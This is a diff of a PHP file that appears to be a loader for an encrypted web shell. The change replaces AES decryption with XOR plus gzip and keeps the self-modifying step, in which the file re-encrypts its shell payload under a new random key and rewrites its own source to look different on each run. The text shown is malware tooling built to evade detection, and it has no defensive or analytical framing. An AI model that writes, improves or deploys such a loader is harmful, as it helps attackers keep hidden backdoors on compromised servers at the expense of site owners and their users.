@@ -1,28 +1,43 @@
 <?php
-// Fixed PHP loader that uses the correct decryption method
+// Fixed PHP loader with a simpler encryption approach
 $key = "my_secret_key"; // Will be replaced with your secret key
 
 // Encrypted payload (will be replaced with actual encrypted shell)
 $payload = "ENCRYPTED_PAYLOAD_PLACEHOLDER";
 
-// Decrypt and execute shell using Method 4 (SHA256 hash with OPENSSL_RAW_DATA)
-$iv = substr(md5($key), 0, 16);
-$key_hash = hash('sha256', $key, true);
-$encrypted_data = base64_decode($payload);
-$shell_code = @openssl_decrypt($encrypted_data, "AES-256-CBC", $key_hash, OPENSSL_RAW_DATA, $iv);
+// Decrypt the payload
+$encrypted = base64_decode($payload);
+$key_bytes = hash('sha256', $key, true);
+$decrypted = '';
 
-// Execute the shell and make it polymorphic
+// XOR decryption
+for ($i = 0; $i < strlen($encrypted); $i++) {
+    $decrypted .= chr(ord($encrypted[$i]) ^ ord($key_bytes[$i % strlen($key_bytes)]));
+}
+
+// Decompress the shell code
+$shell_code = @gzuncompress(base64_decode($decrypted));
+
 if ($shell_code) {
-    // Self-modifying: change the encryption key each time
+    // Self-modifying: change the key each time
     $new_key = bin2hex(random_bytes(8));
-    $new_iv = substr(md5($new_key), 0, 16);
-    $new_key_hash = hash('sha256', $new_key, true);
-    $new_payload = base64_encode(openssl_encrypt($shell_code, "AES-256-CBC", $new_key_hash, OPENSSL_RAW_DATA, $new_iv));
     
-    // Update the file with new key and payload
+    // Re-encrypt with the new key
+    $compressed = gzcompress($shell_code);
+    $encoded = base64_encode($compressed);
+    $new_key_bytes = hash('sha256', $new_key, true);
+    $encrypted = '';
+    
+    for ($i = 0; $i < strlen($encoded); $i++) {
+        $encrypted .= chr(ord($encoded[$i]) ^ ord($new_key_bytes[$i % strlen($new_key_bytes)]));
+    }
+    
+    $new_payload = base64_encode($encrypted);
+    
+    // Update the file with new key and payload - using different regex delimiters
     $current_content = file_get_contents(__FILE__);
     $new_content = preg_replace(
-        ['/\$key = ".*?";/', '/\$payload = ".*?";/'],
+        ['~\$key = ".*?";~', '~\$payload = ".*?";~'],
         ["\$key = \"$new_key\";", "\$payload = \"$new_payload\";"],
         $current_content
     );
